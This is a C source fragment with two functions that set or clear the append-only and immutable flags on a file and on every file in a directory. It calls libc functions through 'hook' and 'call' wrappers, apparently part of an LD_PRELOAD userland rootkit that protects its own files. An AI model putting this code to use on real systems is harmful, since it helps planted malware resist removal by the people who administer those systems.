int doiapath(const char *path, const int apply){
    int fd, ret, chk;
    off_t fpendlen;

    hook(COPEN, CIOCTL);

    fd = (long)call(COPEN, path, 0x0004);
    if(fd < 0) return 0;

    fpendlen = lseek(fd, 0L, SEEK_END);
    if(fpendlen < 1 && apply){
        close(fd);
        return 0;
    }

    if((long)call(CIOCTL, fd, FS_IOC_GETFLAGS, &ret) < 0){
        close(fd);
        return 0;
    }

    chk = ret;
    if(apply) ret |= (FS_APPEND_FL|FS_IMMUTABLE_FL);
    else      ret &=~(FS_APPEND_FL|FS_IMMUTABLE_FL);

    if(ret != chk && (long)call(CIOCTL, fd, FS_IOC_SETFLAGS, &ret) < 0){
        close(fd);
        return 0;
    }

    return close(fd) == 0;
}

int doiadir(const char *pathname, const int apply){
    hook(COPENDIR, CREADDIR);

    DIR *dp = call(COPENDIR, pathname);
    if(dp == NULL) return -1;

    const size_t pathlen = strlen(pathname);
    u_int done = 0;
    struct dirent *dir;
    while((dir = call(CREADDIR, dp)) != NULL){
        if(parent_or_current_dir(dir->d_name))
            continue;
        const size_t len = pathlen + strlen(dir->d_name) + 2;
        char path[len];
        snprintf(path, sizeof(path), "%s/%s", pathname, dir->d_name);
        if(doiapath(path, apply)) ++done;
    }
    closedir(dp);

    return done;
}